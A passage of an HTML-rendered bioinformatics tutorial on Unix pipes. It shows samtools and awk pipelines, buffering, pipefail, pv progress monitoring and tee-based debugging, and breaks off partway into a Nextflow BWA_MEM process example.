<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Without buffer: cat blocks if samtools is slow</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> large.bam </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> samtools view </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># With buffer: Extra memory absorbs the blocking</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> large.bam </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> buffer </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-m</span><span class="token plain"> 500M </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> samtools view </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><br></span></code></pre></div></div>
<p><strong>When to use buffer:</strong></p>
<ul>
<li class="">Downstream process is much slower than upstream</li>
<li class="">You have spare RAM and want to minimize blocking</li>
<li class="">Upstream data is expensive to regenerate</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="5-process-substitution-for-multiple-outputs">5. Process Substitution for Multiple Outputs<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#5-process-substitution-for-multiple-outputs" class="hash-link" aria-label="Direct link to 5. Process Substitution for Multiple Outputs" title="Direct link to 5. Process Substitution for Multiple Outputs" translate="no">​</a></h3>
<p>Fan out to multiple processes from a single input:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Single BAM file → Multiple statistics simultaneously</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">samtools view input.bam </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token function" style="color:hsl(221, 87%, 60%)">tee</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">samtools view </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> read_count.txt</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token function" style="color:hsl(221, 87%, 60%)">awk</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'{print $3}'</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">sort</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">uniq</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> chromosome_dist.txt</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token function" style="color:hsl(221, 87%, 60%)">awk</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'{print $4}'</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">sort</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-n</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> position_stats.txt</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> /dev/null</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># All three statistics generated from a single read of input.bam</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="common-pipe-gotchas-and-solutions">Common Pipe Gotchas and Solutions<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#common-pipe-gotchas-and-solutions" class="hash-link" aria-label="Direct link to Common Pipe Gotchas and Solutions" title="Direct link to Common Pipe Gotchas and Solutions" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="1-buffering-issues-with-pipes">1. Buffering Issues with Pipes<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#1-buffering-issues-with-pipes" class="hash-link" aria-label="Direct link to 1. Buffering Issues with Pipes" title="Direct link to 1. Buffering Issues with Pipes" translate="no">​</a></h3>
<p><strong>Problem:</strong> Interactive commands don't flush output in pipes</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># This might hang (python buffers output in pipe mode)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">python long_script.py </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">tee</span><span class="token plain"> output.log</span><br></span></code></pre></div></div>
<p><strong>Solution:</strong> Disable buffering</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Python: Use -u flag or stdbuf</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">python </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-u</span><span class="token plain"> long_script.py </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">tee</span><span class="token plain"> output.log</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Or use stdbuf</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">stdbuf </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-oL</span><span class="token plain"> python long_script.py </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">tee</span><span class="token plain"> output.log</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="2-error-handling-in-pipes">2. Error Handling in Pipes<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#2-error-handling-in-pipes" class="hash-link" aria-label="Direct link to 2. Error Handling in Pipes" title="Direct link to 2. Error Handling in Pipes" translate="no">​</a></h3>
<p><strong>Problem:</strong> Errors in the middle command are silent</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># If samtools fails, cat and downstream still succeed!</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> input.bam </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> samtools view </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-b</span><span class="token plain"> - </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> output.bam </span><span class="token operator file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">2</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain">/dev/null</span><br></span></code></pre></div></div>
<p><strong>Solution:</strong> Set pipefail</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># If ANY command fails, the entire pipeline fails</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">set</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-o</span><span class="token plain"> pipefail</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> input.bam </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> samtools view </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-b</span><span class="token plain"> - </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> output.bam</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="3-monitoring-pipeline-progress">3. Monitoring Pipeline Progress<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#3-monitoring-pipeline-progress" class="hash-link" aria-label="Direct link to 3. Monitoring Pipeline Progress" title="Direct link to 3. Monitoring Pipeline Progress" translate="no">​</a></h3>
<p><strong>Problem:</strong> Pipes process data silently—hard to see progress</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># No feedback on progress</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> input.fastq </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> process_cmd </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">sort</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> output.txt</span><br></span></code></pre></div></div>
<p><strong>Solution:</strong> Use <code>pv</code> (pipe viewer) to visualize throughput</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Shows progress, speed, and ETA</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> input.fastq </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">pv</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> process_cmd </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">sort</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> output.txt</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Or with file size estimation</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">pv</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-N</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Reading FASTQ"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain"> input.fastq </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> process_cmd </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token function" style="color:hsl(221, 87%, 60%)">pv</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-N</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Sorting output"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">sort</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> output.txt</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="4-debugging-pipe-failures">4. Debugging Pipe Failures<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#4-debugging-pipe-failures" class="hash-link" aria-label="Direct link to 4. Debugging Pipe Failures" title="Direct link to 4. Debugging Pipe Failures" translate="no">​</a></h3>
<p><strong>Problem:</strong> Which command in the pipeline failed?</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Unclear where failure occurred</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">cmd1 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> cmd2 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> cmd3 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> cmd4 failed but </span><span class="token function" style="color:hsl(221, 87%, 60%)">which</span><span class="token plain"> one?</span><br></span></code></pre></div></div>
<p><strong>Solution:</strong> Use intermediate tee files for debugging</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Save intermediate outputs while piping</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">cmd1 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">tee</span><span class="token plain"> /tmp/debug1.txt </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  cmd2 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">tee</span><span class="token plain"> /tmp/debug2.txt </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  cmd3 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">tee</span><span class="token plain"> /tmp/debug3.txt </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  cmd4</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Later, inspect intermediates</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> /tmp/debug1.txt </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">head</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> /tmp/debug2.txt </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">head</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> /tmp/debug3.txt </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">head</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="using-pipes-in-nextflow-modules">Using Pipes in Nextflow Modules<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#using-pipes-in-nextflow-modules" class="hash-link" aria-label="Direct link to Using Pipes in Nextflow Modules" title="Direct link to Using Pipes in Nextflow Modules" translate="no">​</a></h2>
<p>Nextflow pipelines are built from individual processes, and each process can use pipes internally to efficiently chain tools together. This is where pipes truly shine in production bioinformatics workflows.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="real-example-bwa_mem-process-from-sarek">Real Example: BWA_MEM Process from Sarek<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#real-example-bwa_mem-process-from-sarek" class="hash-link" aria-label="Direct link to Real Example: BWA_MEM Process from Sarek" title="Direct link to Real Example: BWA_MEM Process from Sarek" translate="no">​</a></h3>
<p>The Sarek variant calling pipeline includes a <code>BWA_MEM</code> process that demonstrates best practices for using pipes in Nextflow. Let's examine how pipes reduce intermediate files:</p>
<div class="language-groovy codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-groovy codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">process BWA_MEM </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tag </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">$</span><span class="token interpolation-string interpolation expression">meta</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">.id"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    label </span><span class="token string" style="color:hsl(119, 34%, 47%)">'process_high'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    conda </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">moduleDir</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">/environment.yml"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    container "</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">$</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> workflow</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">containerEngine </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'singularity'</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">!</span><span class="token plain">task</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">ext</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">singularity_pull_docker_container </span><span class="token operator" style="color:hsl(221, 87%, 60%)">?</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">'https://community-cr-prod.seqera.io/docker/registry/v2/blobs/sha256/bf/bf7890f8d4e38a7586581cb7fa13401b7af1582f21d94eef969df4cea852b6da/data'</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">'community.wave.seqera.io/library/bwa_htslib_samtools:56c9f8d5201889a4'</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain">"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    input</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tuple </span><span class="token function" style="color:hsl(221, 87%, 60%)">val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">reads</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tuple </span><span class="token function" style="color:hsl(221, 87%, 60%)">val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">index</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tuple </span><span class="token function" style="color:hsl(221, 87%, 60%)">val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta3</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">fasta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    val   sort_bam</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    output</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tuple </span><span class="token function" style="color:hsl(221, 87%, 60%)">val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"*.bam"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> emit</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> bam</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain">    optional</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">true</span><span class="token 